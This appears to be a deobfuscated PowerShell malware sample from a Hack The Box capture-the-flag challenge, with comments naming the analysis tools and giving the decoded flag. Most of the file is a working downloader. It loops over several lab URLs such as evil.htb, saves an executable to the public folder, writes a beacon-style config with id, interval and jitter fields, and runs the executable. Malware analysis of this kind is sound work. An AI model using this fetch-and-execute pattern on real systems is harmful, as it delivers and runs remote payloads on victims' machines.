// Powershell command fetched using app.any.run
// Deobfuscated using PSDecode

. ( $env:coMSpeC[4,15,25]-jOin'') webClientLib = new-object System.Net.WebClient;
randNum = get-random -Minimum 100000 -Maximum 999999;
domains = @("http://evil.htb/4TQf7F/", "http://wepfunds.htb/I0ge4woCYS/", "http://lewistonsports.htb/qUivL/", "https://aluga-design.htb/mykasLBHL1/", "http://madding.htb/M0FNV/");
outFileName = v3Venv:public + "0fI" + randNum + (".exe");
v3VSDD = v3Venv:public + "0fI" + randNum + (".conf");
foreach($domain in domains) {
  try {
    webClientLib.DownloadFile(domain.ToString(), outFileName);
        [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String("aWQ6ICAgICAgIGFFdmFlNGFkZjk=")) | out-file -filepath v3VSDD;
        [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String("aW50ZXJ2YWw6IDMwcw==")) | out-file -append -filepath v3VSDD;
        [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String("aml0dGVyOiAgIDVz")) | out-file -append -filepath v3VSDD;
        <#[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String("ZmxhZzogICAgIEhUQnttbzRSXzBiZnUkYzR0MW9uX24zeHRfdDFtM19wbDM0czN9")) | out-file -append -filepath v3VSDD; #>
        [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String("dXJsOiAgICAgIA==")) | out-file -append -filepath v3VSDD;
        domain | out-file -append -filepath v3VSDD
    &(Invoke-Item)(outFileName);
    break;
  } catch {}
};
outFileName = v3Venv:public + "\" + randNum + (".exe");
v3VSDD = v3Venv:public + "\" + randNum + (".conf");
foreach($domain in domains) {
  try {
    webClientLib.DownloadFile(domain.ToString(), outFileName);
        [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String("aWQ6ICAgICAgIGFFdmFlNGFkZjk=")) | out-file -filepath v3VSDD;
        [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String("aW50ZXJ2YWw6IDMwcw==")) | out-file -append -filepath v3VSDD;
        [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String("aml0dGVyOiAgIDVz")) | out-file -append -filepath v3VSDD;
        <#[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String("ZmxhZzogICAgIEhUQnttbzRSXzBiZnUkYzR0MW9uX24zeHRfdDFtM19wbDM0czN9")) | out-file -append -filepath v3VSDD; #>
        [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String("dXJsOiAgICAgIA==")) | out-file -append -filepath v3VSDD;
        domain | out-file -append -filepath v3VSDD
    &(Invoke-Item)(outFileName);
    break;
  } catch {}
}' )

// "ZmxhZzogICAgIEhUQnttbzRSXzBiZnUkYzR0MW9uX24zeHRfdDFtM19wbDM0czN9" - "flag:     HTB{mo4R_0bfu$c4t1on_n3xt_t1m3_pl34s3}"